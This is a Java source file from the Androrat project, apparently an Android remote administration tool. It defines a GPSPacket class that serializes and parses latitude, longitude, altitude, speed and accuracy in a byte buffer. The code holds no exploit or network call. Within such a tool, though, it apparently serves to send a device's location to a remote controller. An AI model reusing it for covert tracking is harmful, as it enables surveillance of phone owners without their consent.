/*
  Part of the Androrat project - https://github.com/RobinDavid/androrat

  Copyright (c) 2012 Robin David

  This library is free software; you can redistribute it and/or
  modify it under the terms of the GNU Lesser General Public
  License as published by the Free Software Foundation, version 3.

  This library is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
  Lesser General Public License for more details.

  You should have received a copy of the GNU Lesser General
  Public License along with this library; if not, write to the
  Free Software Foundation, Inc., 59 Temple Place, Suite 330,
  Boston, MA  02111-1307  USA
*/
package Packet;

import java.nio.ByteBuffer;

public class GPSPacket implements Packet
{

	private double longitude;
	private double latitude;
	private double altitude;
	private float speed;
	private float accuracy;
	

	public GPSPacket()
	{
		
	}
	
	public GPSPacket(double lat, double lon, double alt, float speed, float acc)
	{
		this.latitude = lat ;
		this.longitude = lon ;
		this.altitude = alt;
		this.speed = speed;
		this.accuracy = acc;
	}
	
	public byte[] build()
	{
		ByteBuffer b = ByteBuffer.allocate(32);
		System.out.println("Longitude : "+longitude);
		b.putDouble(this.longitude);
		b.putDouble(this.latitude);
		b.putDouble(this.altitude);
		b.putFloat(this.speed);
		b.putFloat(this.accuracy);
		return b.array();
	}

	public void parse(byte[] packet)
	{
		ByteBuffer b = ByteBuffer.wrap(packet);
		this.longitude = b.getDouble();
		this.latitude = b.getDouble();
		this.altitude = b.getDouble();
		this.speed = b.getFloat();
		this.accuracy = b.getFloat();
	}

	

	public double getLongitude()
	{
		return longitude;
	}

	public double getLatitude()
	{
		return latitude;
	}

	public double getAltitude()
	{
		return altitude;
	}

	public float getSpeed()
	{
		return speed;
	}

	public float getAccuracy()
	{
		return accuracy;
	}

}
